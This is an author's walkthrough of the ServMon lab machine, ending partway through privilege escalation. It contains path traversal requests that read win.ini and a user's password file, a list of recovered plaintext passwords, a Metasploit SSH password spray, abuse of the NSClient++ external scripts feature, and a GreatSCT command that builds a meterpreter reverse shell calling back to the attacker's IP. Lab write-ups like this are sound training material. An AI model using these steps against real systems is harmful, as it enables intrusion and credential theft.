----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# ServMon
# 14/4/2023
10.10.10.184

----------------------------------------------------
# nmap
----------------------------------------------------
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp   open  http
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt

----------------------------------------------------
# enum
----------------------------------------------------
ftp 10.10.10.184
anonymous
passive
ls
cd Users
ls Nadine
get "Nadine\\Confidential.txt"
ls Nathan
get "Nathan\\Notes to do.txt"


Inspection of port 80 in a browser reveals a login page for the NVMS-1000 network surveillance
software. The default credentials admin / 123456 or other common credentials do not give us
access.


Inspection of port 8443 shows a login screen for NSClient++ . Attempting to login with common
passwords is also unsuccessful.
https://10.10.10.184:8443/


----------------------------------------------------
# foothold
----------------------------------------------------
└─$ searchsploit nvms

Configure the browser to use Burp as a proxy, 
refresh the NVMS-1000 web page and intercept
the request. Hit CTRL + R to send the request to Burp's Repeater module. 
Substitute the GET
request on the first line with the payload below. The file win.ini exists in on Windows
installations and is readable by all users, and so is a good target for verifying a LFI.
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1


The win.ini file is displayed, which validates the vulnerability. 
Using the information from the FTP
server let's try to open C:\Users\Nathan\Desktop\Passwords.txt .

GET /../../../../../../../../../../../../Users\Nathan\Desktop\Passwords.txt HTTP/1.1

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

We can attempt a password spray against SSH. Save the above list as passwords.txt. Examination
of FTP revealed the users Nadine and Nathan . Add them to a users.txt along with
administrator .


use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.184
set USER_FILE users.txt

nadine
nathan

set PASS_FILE passwords.txt
run

[+] 10.10.10.184:22 - Success: 'nadine:L1k3B1gBut7s@W0rk' 'Microsoft Windows [Version 10.0.17763.864]'

The password L1k3B1gBut7s@W0rk was found to work for the username nadine , and a
command shell is opened as this user. However, the command whoami /priv reveals that they
are an unprivileged user.

----------------------------------------------------
# priv esc
----------------------------------------------------
Enumerating of the filesystem reveals the non-default directory C:\Program
Files\NSClient++\ . The .ini file for NSClient is found inside. Let's read it

We can also identify the version with the command:
cmd /c "C:\Program Files\NSClient++\nscp.exe" web -- password --display

PS C:\Program Files\NSClient++> cat nsclient.ini
password = ew2x6SsGTxjRwXOT


We have gained the password for the web app, and know that localhost is the only whitelisted
entry. Researching NSClient online we come upon this privilege escalation technique, involving
feature abuse. The software version mentioned in this procedure is 0.5.2.35 . The following
command reveals that the same software version is installed on the box.
->cmd /c "C:\Program Files\NSClient++\nscp.exe" --version




ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184

https://localhost:8443/
Let's set up an SSH tunnel to access the web app from localhost port 8443
Navigate to https://localhost:8443 and use the password found in the ini file to login.
Let's create an external script that will execute our payload on the system. Navigate to Settings
> External Scripts > Scripts and click + Add new .

Next, input /settings/external scripts/scripts/shell in the Section field, the command in
the Key field, and C:\Temp\pwn.bat in Value . The bat file will be used to run commands as
system.



cd ~/
git clone https://github.com/GreatSCT/GreatSCT
cd GreatSCT
sudo ./GreatSCT.py --ip 10.10.14.13 --port 1234 -t bypass -p
regsvcs/meterpreter/rev_tcp.py -o serv